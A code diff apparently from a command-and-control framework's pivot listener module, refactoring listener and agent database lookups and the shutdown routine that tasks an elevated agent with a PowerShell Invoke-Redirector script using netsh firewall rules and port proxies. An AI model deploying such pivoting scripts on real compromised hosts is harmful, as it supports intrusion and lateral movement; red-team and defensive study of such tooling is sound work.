@@ -704,10 +704,10 @@ class Listener:
                     return False
 
                 # validate that the Listener does exist
-                if self.mainMenu.listeners.is_listener_valid(listenerName):
+                if self.mainMenu.listenersv2.get_active_listener_by_name(listenerName):
                     # check if a listener for the agent already exists
 
-                    if self.mainMenu.listeners.is_listener_valid(
+                    if self.mainMenu.listenersv2.get_active_listener_by_name(
                         tempOptions["Name"]["Value"]
                     ):
                         log.error(
@@ -862,93 +862,91 @@ class Listener:
             self.instance_log.info(f"{name}: shutting down...")
             log.info(f"{name}: shutting down...")
 
-            sessionID = self.mainMenu.agents.get_agent_id_db(name)
-            isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)
-            if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:
-                if self.mainMenu.agents.get_language_db(sessionID).startswith("po"):
-                    script = """
-                function Invoke-Redirector {
-                    param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
-                    if($ShowAll){
-                        $out = netsh interface portproxy show all
-                        if($out){
-                            $out
-                        }
-                        else{
-                            "[*] no redirectors currently configured"
-                        }
-                    }
-                    elseif($Reset){
-                        Netsh.exe advfirewall firewall del rule name="$FirewallName"
-                        $out = netsh interface portproxy reset
-                        if($out){
-                            $out
-                        }
-                        else{
-                            "[+] successfully removed all redirectors"
-                        }
-                    }
-                    else{
-                        if((-not $ListenPort)){
-                            "[!] netsh error: required option not specified"
-                        }
-                        else{
-                            $ConnectAddress = ""
-                            $ConnectPort = ""
+            with SessionLocal() as db:
+                agent = self.mainMenu.agentsv2.get_by_name(db, name)
 
-                            $parts = $ConnectHost -split(":")
-                            if($parts.Length -eq 2){
-                                # if the form is http[s]://HOST or HOST:PORT
-                                if($parts[0].StartsWith("http")){
-                                    $ConnectAddress = $parts[1] -replace "//",""
-                                    if($parts[0] -eq "https"){
-                                        $ConnectPort = "443"
-                                    }
-                                    else{
-                                        $ConnectPort = "80"
-                                    }
-                                }
-                                else{
-                                    $ConnectAddress = $parts[0]
-                                    $ConnectPort = $parts[1]
-                                }
-                            }
-                            elseif($parts.Length -eq 3){
-                                # if the form is http[s]://HOST:PORT
-                                $ConnectAddress = $parts[1] -replace "//",""
-                                $ConnectPort = $parts[2]
-                            }
-                            if($ConnectPort -ne ""){
-                                Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
-                                $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
-                                if($out){
-                                    $out
-                                }
-                                else{
-                                    "[+] successfully added redirector on port $ListenPort to $ConnectHost"
-                                }
+                if not agent:
+                    log.error("Agent is not present in the cache or not elevated")
+                    return
+
+                if agent.high_integrity:
+                    if agent.language.startswith("po"):
+                        script = """
+                    function Invoke-Redirector {
+                        param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
+                        if($ShowAll){
+                            $out = netsh interface portproxy show all
+                            if($out){
+                                $out
                             }
                             else{
-                                "[!] netsh error: host not in http[s]://HOST:[PORT] format"
+                                "[*] no redirectors currently configured"
+                            }
+                        }
+                        elseif($Reset){
+                            Netsh.exe advfirewall firewall del rule name="$FirewallName"
+                            $out = netsh interface portproxy reset
+                            if($out){
+                                $out
+                            }
+                            else{
+                                "[+] successfully removed all redirectors"
+                            }
+                        }
+                        else{
+                            if((-not $ListenPort)){
+                                "[!] netsh error: required option not specified"
+                            }
+                            else{
+                                $ConnectAddress = ""
+                                $ConnectPort = ""
+
+                                $parts = $ConnectHost -split(":")
+                                if($parts.Length -eq 2){
+                                    # if the form is http[s]://HOST or HOST:PORT
+                                    if($parts[0].StartsWith("http")){
+                                        $ConnectAddress = $parts[1] -replace "//",""
+                                        if($parts[0] -eq "https"){
+                                            $ConnectPort = "443"
+                                        }
+                                        else{
+                                            $ConnectPort = "80"
+                                        }
+                                    }
+                                    else{
+                                        $ConnectAddress = $parts[0]
+                                        $ConnectPort = $parts[1]
+                                    }
+                                }
+                                elseif($parts.Length -eq 3){
+                                    # if the form is http[s]://HOST:PORT
+                                    $ConnectAddress = $parts[1] -replace "//",""
+                                    $ConnectPort = $parts[2]
+                                }
+                                if($ConnectPort -ne ""){
+                                    Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
+                                    $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
+                                    if($out){
+                                        $out
+                                    }
+                                    else{
+                                        "[+] successfully added redirector on port $ListenPort to $ConnectHost"
+                                    }
+                                }
+                                else{
+                                    "[!] netsh error: host not in http[s]://HOST:[PORT] format"
+                                }
                             }
                         }
                     }
-                }
-                Invoke-Redirector"""
+                    Invoke-Redirector"""
 
-                    script += " -Reset"
-                    script += " -FirewallName %s" % (sessionID)
+                        script += " -Reset"
+                        script += f" -FirewallName {agent.session_id}"
 
-                    with SessionLocal.begin() as db:
-                        agent = self.mainMenu.agentsv2.get_by_id(db, sessionID)
                         self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
-                    msg = "Tasked agent to uninstall Pivot listener "
-                    self.mainMenu.agents.save_agent_log(sessionID, msg)
+                        msg = "Tasked agent to uninstall Pivot listener "
+                        self.mainMenu.agents.save_agent_log(agent.session_id, msg)
 
-                elif self.mainMenu.agents.get_language_db(sessionID).startswith("py"):
-                    log.error("Shutdown not implemented for python")
-
-            else:
-                log.error("Agent is not present in the cache or not elevated")
-
-        pass
+                    elif agent.language.startswith("py"):
+                        log.error("Shutdown not implemented for python")
